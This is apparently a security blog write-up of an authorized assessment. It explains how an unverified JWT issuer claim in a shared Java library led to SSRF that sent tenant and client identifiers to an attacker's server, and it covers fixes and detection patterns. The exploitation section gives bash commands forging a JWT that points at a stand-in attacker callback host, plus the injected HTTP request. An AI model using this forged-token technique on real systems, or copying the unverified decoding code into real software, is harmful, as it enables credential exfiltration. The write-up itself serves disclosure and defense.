---
layout: default
title: "Auth Bypass to SSRF via JWT Parsing Flaw"
category: writeups
difficulty: advanced
tags: [jwt, ssrf, authentication, cloud, credential-leakage]
---

# How I Turned a JWT Parsing Flaw Into Full SSRF With Credential Leakage

> A white-box security assessment of a cloud-native SaaS platform revealed that a shared authentication library decoded JWT tokens without signature verification. The extracted claims were then used to construct outbound HTTP requests — turning a cryptographic oversight into a server-side request forgery (SSRF) vulnerability with credential exfiltration.

---

## TL;DR

- **Vulnerability Class:** CWE-345 (Insufficient Verification of Data Authenticity) chained with CWE-918 (Server-Side Request Forgery)
- **Severity:** Critical (CVSS 9.1)
- **Root Cause:** JWT payload decoded via Base64 without cryptographic signature verification; extracted issuer claim used to build outbound HTTP request URLs
- **Impact:** Attacker-controlled SSRF with automatic inclusion of tenant credentials in outbound requests
- **Blast Radius:** Shared library — every downstream microservice inherited the vulnerability

---

## The Architecture

The target was a multi-tenant document processing platform running on a cloud PaaS. The architecture followed a common pattern:

```
[Browser] → [Approuter] → [Backend Microservices] → [Identity Provider (IAS)]
```

For user resolution (displaying names, managing assignments), backend services needed to call the identity provider's SCIM API. The identity provider URL was communicated via a JWT token passed in an HTTP header between infrastructure layers.

The flow was designed as:

```
1. Infrastructure layer authenticates user
2. Infrastructure injects a signed JWT into inter-service header
3. Backend reads JWT → extracts issuer URL → calls SCIM API at that URL
```

The critical assumption: **the JWT in that header is always legitimate because only trusted infrastructure can set it.**

---

## The Vulnerability

### Phase 1: JWT Decoded Without Verification

During code review, I found this in a shared authentication library consumed by every microservice:

```java
public String getIasIssuer() {
    String jwt = this.headerFacade.getIasJWT();       // Read from HTTP header
    String[] jwtParts = jwt.split("\\.");              // Split into 3 parts
    String payload = new String(
        Base64.getUrlDecoder().decode(jwtParts[1])    // Decode middle section
    );
    JSONObject payloadJson = new JSONObject(payload);
    return payloadJson.optString("ias_iss",           // Extract issuer claim
        payloadJson.optString("iss", null));
}
```

The problems are immediately visible:

| What's Missing | Why It Matters |
|---|---|
| No signature verification (`jwtParts[2]` never checked) | Any Base64-encoded JSON is accepted as truth |
| No issuer allowlist validation | The extracted URL can point anywhere |
| No token expiration check | Forged tokens never expire |
| No audience validation | Token accepted regardless of intended recipient |

### Phase 2: Issuer Claim Used as HTTP Target

The extracted issuer URL was stored in the user context and later used by a helper service to make SCIM API calls:

```java
private Map<String, User> getUsersFromCursor(
        String tenantId, String iasIssuer, String cursor,
        Map<String, User> accumulatedUsers) {

    HttpRequest request = HttpRequest.newBuilder()
        .uri(URI.create(
            String.format("%s/idds/apps/v1/scim/Users/.search", iasIssuer)
        ))                                           // ← Attacker controls this URL
        .header("x-app_tid", tenantId)               // ← Tenant ID leaked
        .header("x-client_id", clientIdentity)       // ← Client credential leaked
        .header("Content-Type", "application/scim+json")
        .POST(HttpRequest.BodyPublishers.ofString(scimPayload))
        .build();

    HttpResponse<String> response = httpClient.send(request, ...);
    // ...
}
```

The attack chain crystallized:

```
Forged JWT → Unverified decode → Attacker URL extracted
    → HTTP POST to attacker URL with tenant credentials in headers
```

---

## Exploitation

### Step 1: Craft the Forged JWT

A JWT has three Base64-encoded parts: `header.payload.signature`. Since signature is never verified, I can put anything:

```bash
# Forge a payload pointing to my callback server
HEADER=$(echo -n '{"alg":"RS256","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"ias_iss":"https://attacker-callback.example.com"}' | base64 | tr '+/' '-_' | tr -d '=')

# Signature can literally be anything
FORGED_JWT="${HEADER}.${PAYLOAD}.fakesignature"
```

### Step 2: Inject Into Request

The JWT is read from a specific HTTP header. I added it to a legitimate authenticated request:

```http
GET /api/v1/UserService/Users HTTP/1.1
Host: target-platform.example.com
Authorization: Bearer <valid-session-token>
x-ias-jwt: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXNfaXNzIjoiaHR0cHM6Ly9hdHRhY2tlci1jYWxsYmFjay5leGFtcGxlLmNvbSJ9.ZmFrZXNpZw
Accept: application/json
```

### Step 3: Observe the Callback

The server responded with **HTTP 408 Request Timeout** — it attempted an outbound connection to my controlled URL and hung waiting for a valid SCIM response.

### Step 4: Confirm with DNS/HTTP Callback

Using an out-of-band interaction service, I confirmed the server resolved my domain and initiated a POST request to:

```
POST /idds/apps/v1/scim/Users/.search
```

With headers containing:
- `x-app_tid: <real-tenant-identifier>`
- `x-client_id: <real-service-client-id>`

---

## Impact Assessment

| Impact | Description |
|---|---|
| **SSRF** | Server makes outbound HTTP requests to arbitrary URLs |
| **Credential Leakage** | Tenant ID and client identity sent to attacker in headers |
| **Multi-tenant Risk** | Any tenant's user resolution can be redirected |
| **Shared Library** | Every microservice using the library is vulnerable |
| **Chain Potential** | Combined with other findings (unauthenticated endpoints), exploitable without any authentication |

---

## The Fix

The remediation requires three layers:

### 1. Verify JWT Signature

```java
public String getIasIssuer() {
    String jwt = this.headerFacade.getIasJWT();

    // Verify signature against trusted JWKS
    DecodedJWT verified = JWT.require(
            Algorithm.RSA256(trustedKeyProvider))
        .withIssuer(ALLOWED_IAS_ISSUERS)    // Allowlist
        .acceptExpiresAt(300)                // Check expiry
        .build()
        .verify(jwt);                        // Cryptographic verification

    return verified.getClaim("ias_iss").asString();
}
```

### 2. Validate Issuer URL Against Allowlist

```java
private static final Set<String> TRUSTED_ISSUERS = Set.of(
    "https://accounts.sap.com",
    "https://*.accounts400.ondemand.com"
);

private void validateIssuer(String issuerUrl) {
    URI uri = URI.create(issuerUrl);
    if (!TRUSTED_ISSUERS.stream().anyMatch(
            pattern -> matchesPattern(uri.getHost(), pattern))) {
        throw new SecurityException("Untrusted IAS issuer: " + issuerUrl);
    }
}
```

### 3. Egress Filtering

Even with JWT verification, defense-in-depth requires network-level controls:
- Restrict outbound HTTP to known identity provider IPs
- Block requests to private IP ranges (SSRF protection)
- Monitor and alert on unexpected outbound connections

---

## Key Takeaways

1. **A JWT without signature verification is just JSON with extra steps.** The `alg`, `typ`, and dot-separated structure give a false sense of security. Without verification, it's arbitrary attacker-controlled input.

2. **Shared libraries amplify vulnerabilities.** A single flaw in a common authentication library propagated to every service in the platform. Security review of shared code deserves disproportionate attention.

3. **Trust boundaries matter.** The design assumed "only infrastructure sets this header." But headers can be injected by proxies, load balancers, or other vulnerabilities in the chain. Cryptographic verification is the only reliable trust mechanism.

4. **SSRF hides in data flows, not just URL parameters.** This SSRF wasn't in an obvious `?url=` parameter — it was buried three layers deep in a JWT claim → user context attribute → HTTP client call chain. Tracing data from source to sink across service boundaries is essential.

---

## Detection

If you're auditing for this pattern, search for:

```
# Java
jwt.split("\\.")
Base64.getUrlDecoder().decode(jwtParts[1])
# Without corresponding .verify() calls

# Python
jwt.decode(token, options={"verify_signature": False})
payload = base64.b64decode(token.split('.')[1])

# Node.js
JSON.parse(Buffer.from(token.split('.')[1], 'base64'))
```

Any JWT payload extraction without a corresponding signature verification call is a finding.

---

*Found during an authorized white-box security assessment. All findings were reported through responsible disclosure and have been remediated.*
